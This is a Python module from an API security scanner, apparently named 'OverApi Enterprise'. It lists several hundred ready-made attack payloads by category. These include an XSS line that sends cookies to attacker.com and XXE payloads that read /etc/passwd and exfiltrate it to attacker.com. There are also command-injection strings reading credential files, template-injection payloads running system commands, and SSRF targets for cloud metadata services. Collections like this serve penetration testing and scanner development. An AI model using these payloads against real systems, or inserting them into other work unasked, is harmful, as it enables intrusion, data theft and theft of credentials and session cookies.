"""
OverApi Enterprise - Comprehensive Payload Library
150+ detection rules and payloads for API security testing
"""

from typing import Dict, List


class EnterprisePayloads:
    """
    Enterprise-grade payload library with 150+ detection rules
    Covers OWASP API Security Top 10 and beyond
    """

    # SQL Injection Payloads (30+)
    SQL_INJECTION = [
        # Classic SQLi
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "' OR 1=1--",
        "' OR 1=1#",
        "' OR 1=1/*",
        "admin' --",
        "admin' #",
        "admin'/*",
        "' or 1=1--",
        "' or 1=1#",
        "' or 1=1/*",
        "') or '1'='1--",
        "') or ('1'='1--",

        # Union-based SQLi
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION ALL SELECT NULL--",
        "' UNION ALL SELECT NULL,NULL--",

        # Time-based blind SQLi
        "'; WAITFOR DELAY '0:0:5'--",
        "'; SELECT SLEEP(5)--",
        "'; pg_sleep(5)--",
        "' AND SLEEP(5)--",
        "' OR SLEEP(5)--",

        # Boolean-based blind SQLi
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND 'x'='x",
        "' AND 'x'='y",

        # Error-based SQLi
        "' AND 1=CONVERT(int,(SELECT @@version))--",
        "' AND 1=CAST((SELECT @@version) AS int)--",
    ]

    # NoSQL Injection Payloads (15+)
    NOSQL_INJECTION = [
        # MongoDB
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"$ne": ""}',
        '{"$regex": ".*"}',
        '{"$where": "this.password.length > 0"}',
        '{"$where": "sleep(5000)"}',

        # CouchDB
        '{"selector": {"_id": {"$gt": null}}}',

        # Query operators
        '{"$or": [{"user": "admin"}, {"user": "root"}]}',
        '{"$and": [{"user": {"$ne": ""}}, {"pass": {"$ne": ""}}]}',

        # JavaScript injection in MongoDB
        "'; return true; var foo='",
        "'; return this.password.length > 0; var foo='",

        # Array injection
        '[]',
        '[""]',
        '[{"$gt": ""}]',
        '{"user": {"$in": ["admin", "root", "test"]}}',
    ]

    # XSS Payloads (25+)
    XSS = [
        # Basic XSS
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<iframe src="javascript:alert(1)">',
        '<body onload=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
        '<select onfocus=alert(1) autofocus>',
        '<textarea onfocus=alert(1) autofocus>',
        '<marquee onstart=alert(1)>',
        '<details open ontoggle=alert(1)>',

        # Filter bypass
        '<ScRiPt>alert(1)</ScRiPt>',
        '<script>alert(String.fromCharCode(88,83,83))</script>',
        '<img src="x" onerror="alert(1)">',
        '<IMG SRC=x OnErRoR=alert(1)>',
        '<img src=x onerror=alert`1`>',

        # Event handlers
        '<div onmouseover=alert(1)>hover</div>',
        '<a href="javascript:alert(1)">click</a>',
        '<form action="javascript:alert(1)">',

        # SVG-based
        '<svg><script>alert(1)</script></svg>',
        '<svg><animate onbegin=alert(1)>',
        '<svg><a xlink:href="javascript:alert(1)">',

        # DOM-based
        '<script>document.location="http://attacker.com/steal.php?c="+document.cookie</script>',
        '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',

        # WAF bypass
        '<script>a=/XSS/;alert(a.source)</script>',
        '<script>alert(/XSS/.source)</script>',
    ]

    # Command Injection Payloads (20+)
    COMMAND_INJECTION = [
        # Linux/Unix
        '; ls -la',
        '| ls -la',
        '|| ls -la',
        '& ls -la',
        '&& ls -la',
        '`ls -la`',
        '$(ls -la)',

        # Time-based detection
        '; sleep 5',
        '| sleep 5',
        '|| sleep 5',
        '& sleep 5',
        '&& sleep 5',
        '`sleep 5`',
        '$(sleep 5)',

        # Windows
        '& dir',
        '&& dir',
        '| dir',
        '|| dir',

        # File read attempts
        '; cat /etc/passwd',
        '| cat /etc/passwd',
        '; type C:\\Windows\\System32\\drivers\\etc\\hosts',
    ]

    # XXE (XML External Entity) Payloads (10+)
    XXE = [
        # Basic XXE
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',

        # Blind XXE
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>',

        # XXE with parameter entities
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://attacker.com/?x=%file;\'>">%eval;%exfil;]>',

        # SOAP XXE
        '<soap:Body><foo><![CDATA[<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>]]></foo></soap:Body>',

        # Billion Laughs attack
        '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">]><lolz>&lol2;</lolz>',

        # XXE with UTF-7
        '<?xml version="1.0" encoding="UTF-7"?>+ADw-foo+AD4-test+ADw-/foo+AD4-',

        # SVG XXE
        '<svg xmlns="http://www.w3.org/2000/svg"><script><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]></script></svg>',

        # Office documents XXE
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>&xxe;</w:t></w:r></w:p></w:body></w:document>',
    ]

    # LDAP Injection Payloads (10+)
    LDAP_INJECTION = [
        '*',
        '*)(&',
        '*)(uid=*))(|(uid=*',
        'admin)(&',
        'admin)(|(password=*',
        '*)(objectClass=*',
        '*)(uid=*)(|(uid=*',
        '*)(|(objectClass=*',
        '*)|(cn=*',
        '*)(userPassword=*',
    ]

    # XPath Injection Payloads (10+)
    XPATH_INJECTION = [
        "' or '1'='1",
        "' or 1=1 or ''='",
        "' or ''='",
        "x' or 1=1 or 'x'='y",
        '//*',
        "//user[name/text()='admin' or '1'='1']/password/text()",
        "' or name()='username' or 'a'='a",
        "' or count(parent::*)>0 or ''='",
        "' and count(/*)>0 and ''='",
        "' or string-length(name())>0 or ''='",
    ]

    # Template Injection Payloads (SSTI) (15+)
    TEMPLATE_INJECTION = [
        # Jinja2/Flask
        '{{7*7}}',
        '{{config}}',
        '{{config.items()}}',
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",

        # Twig
        '{{7*7}}',
        '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}',

        # Freemarker
        '${7*7}',
        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',

        # Velocity
        '#set($x=7*7)$x',
        '#set($rt=$Class.forName("java.lang.Runtime"))#set($chr=$Class.forName("java.lang.Character"))#set($str=$Class.forName("java.lang.String"))$rt.getRuntime().exec("id")',

        # Smarty
        '{$smarty.version}',
        '{php}echo `id`;{/php}',

        # ERB (Ruby)
        '<%= 7*7 %>',
        '<%= system("id") %>',
    ]

    # SSRF Payloads (15+)
    SSRF = [
        # Internal network
        'http://127.0.0.1',
        'http://127.0.0.1:80',
        'http://127.0.0.1:8080',
        'http://localhost',
        'http://0.0.0.0',
        'http://[::1]',
        'http://169.254.169.254/latest/meta-data/',  # AWS metadata
        'http://metadata.google.internal/computeMetadata/v1/',  # GCP metadata

        # Protocol wrappers
        'file:///etc/passwd',
        'file:///c:/windows/win.ini',
        'dict://localhost:11211/stat',
        'gopher://localhost:6379/_',

        # Bypass techniques
        'http://127.1',
        'http://2130706433',  # 127.0.0.1 in decimal
        'http://0x7f000001',  # 127.0.0.1 in hex
    ]

    # Path Traversal Payloads (15+)
    PATH_TRAVERSAL = [
        '../',
        '..\\',
        '../../',
        '../../../',
        '../../../../',
        '../../../../../',
        '../../../../../../',
        '../../../../../../../',

        # URL encoded
        '%2e%2e/',
        '%2e%2e%2f',
        '..%2f',
        '%2e%2e\\',

        # Double encoding
        '%252e%252e/',
        '..%252f',

        # Unicode
        '..%c0%af',
        '..%c1%9c',
    ]

    # JWT Attack Payloads
    JWT_ATTACKS = [
        # Algorithm confusion
        'alg=none',
        'alg=None',
        'alg=NONE',
        'alg=nOnE',

        # Weak algorithms
        'alg=HS256',  # When RS256 expected
        'alg=RS256',  # When HS256 expected

        # Null signature
        'signature=""',

        # Key confusion
        'kid=../../dev/null',
        'kid=/proc/self/environ',
        'kid=../../../etc/passwd',
    ]

    # Authentication Bypass Payloads (20+)
    AUTH_BYPASS = [
        # Header manipulation
        {'X-Forwarded-For': '127.0.0.1'},
        {'X-Originating-IP': '127.0.0.1'},
        {'X-Remote-IP': '127.0.0.1'},
        {'X-Client-IP': '127.0.0.1'},
        {'X-Real-IP': '127.0.0.1'},
        {'X-Original-URL': '/admin'},
        {'X-Rewrite-URL': '/admin'},

        # Method override
        {'X-HTTP-Method-Override': 'PUT'},
        {'X-HTTP-Method-Override': 'DELETE'},
        {'X-Method-Override': 'PUT'},

        # Role manipulation
        {'X-User-Role': 'admin'},
        {'X-Admin': 'true'},
        {'X-Is-Admin': '1'},

        # Parameter pollution
        'role=admin',
        'admin=true',
        'is_admin=1',
        'access_level=admin',
        'permission=all',
        'privilege=admin',
    ]

    # CSRF Payloads
    CSRF = [
        # Token bypass attempts
        'csrf_token=',
        'csrf_token=null',
        'csrf_token=invalid',
        'X-CSRF-Token: invalid',

        # Origin/Referer manipulation
        {'Origin': 'null'},
        {'Origin': 'http://attacker.com'},
        {'Referer': 'http://attacker.com'},
    ]

    # Mass Assignment Payloads
    MASS_ASSIGNMENT = [
        # Privilege escalation
        '{"role": "admin"}',
        '{"is_admin": true}',
        '{"admin": true}',
        '{"privileges": "admin"}',
        '{"access_level": 99}',
        '{"permission": "*"}',

        # User manipulation
        '{"id": 1}',
        '{"user_id": 1}',
        '{"account_id": 1}',

        # Price manipulation
        '{"price": 0}',
        '{"price": -1}',
        '{"amount": 0}',
        '{"total": 0}',
    ]

    # Parameter Pollution Payloads
    PARAM_POLLUTION = [
        # HTTP Parameter Pollution
        'id=1&id=2',
        'user=victim&user=admin',
        'role=user&role=admin',

        # Array injection
        'id[]=1&id[]=2',
        'user[]=victim&user[]=admin',

        # JSON pollution
        '{"id": 1, "id": 2}',
        '{"role": "user", "role": "admin"}',
    ]

    # Race Condition Payloads
    RACE_CONDITION = [
        # Coupon reuse
        'coupon_code=SAVE50',

        # Parallel requests
        'action=redeem',
        'action=transfer',
        'action=withdraw',
    ]

    # Business Logic Payloads
    BUSINESS_LOGIC = [
        # Negative values
        'quantity=-1',
        'amount=-100',
        'price=-50',

        # Zero values
        'quantity=0',
        'price=0',

        # Large values
        'quantity=999999',
        'amount=999999999',

        # Workflow bypass
        'step=5',  # Skip to final step
        'status=completed',
        'verified=true',
    ]

    # API-specific Headers for Testing
    TEST_HEADERS = [
        # Debug/Admin headers
        {'X-Debug': 'true'},
        {'X-Debug-Mode': '1'},
        {'X-Test-Mode': 'true'},
        {'X-Admin': 'true'},
        {'X-Developer': 'true'},

        # Version headers
        {'X-API-Version': '0.0.1'},
        {'X-API-Version': 'v0'},
        {'Accept-Version': '~1'},

        # Content-Type attacks
        {'Content-Type': 'application/x-www-form-urlencoded'},
        {'Content-Type': 'text/xml'},
        {'Content-Type': 'application/xml'},
        {'Content-Type': 'multipart/form-data'},
    ]

    # Security Headers to Check
    SECURITY_HEADERS = [
        'Strict-Transport-Security',
        'X-Frame-Options',
        'X-Content-Type-Options',
        'Content-Security-Policy',
        'X-XSS-Protection',
        'Referrer-Policy',
        'Permissions-Policy',
        'X-Permitted-Cross-Domain-Policies',
        'Access-Control-Allow-Origin',
        'Access-Control-Allow-Credentials',
        'Access-Control-Expose-Headers',
        'Access-Control-Allow-Methods',
        'Access-Control-Allow-Headers',
        'X-Download-Options',
        'X-DNS-Prefetch-Control',
    ]

    @classmethod
    def get_all_payloads(cls) -> Dict[str, List]:
        """Get all payloads organized by category"""
        return {
            'sql_injection': cls.SQL_INJECTION,
            'nosql_injection': cls.NOSQL_INJECTION,
            'xss': cls.XSS,
            'command_injection': cls.COMMAND_INJECTION,
            'xxe': cls.XXE,
            'ldap_injection': cls.LDAP_INJECTION,
            'xpath_injection': cls.XPATH_INJECTION,
            'template_injection': cls.TEMPLATE_INJECTION,
            'ssrf': cls.SSRF,
            'path_traversal': cls.PATH_TRAVERSAL,
            'jwt_attacks': cls.JWT_ATTACKS,
            'auth_bypass': cls.AUTH_BYPASS,
            'csrf': cls.CSRF,
            'mass_assignment': cls.MASS_ASSIGNMENT,
            'param_pollution': cls.PARAM_POLLUTION,
            'race_condition': cls.RACE_CONDITION,
            'business_logic': cls.BUSINESS_LOGIC,
            'test_headers': cls.TEST_HEADERS,
            'security_headers': cls.SECURITY_HEADERS,
        }

    @classmethod
    def get_payloads_by_category(cls, category: str) -> List:
        """Get payloads for specific category"""
        all_payloads = cls.get_all_payloads()
        return all_payloads.get(category, [])

    @classmethod
    def get_payload_count(cls) -> int:
        """Get total number of payloads"""
        total = 0
        for payloads in cls.get_all_payloads().values():
            if isinstance(payloads, list):
                total += len(payloads)
        return total
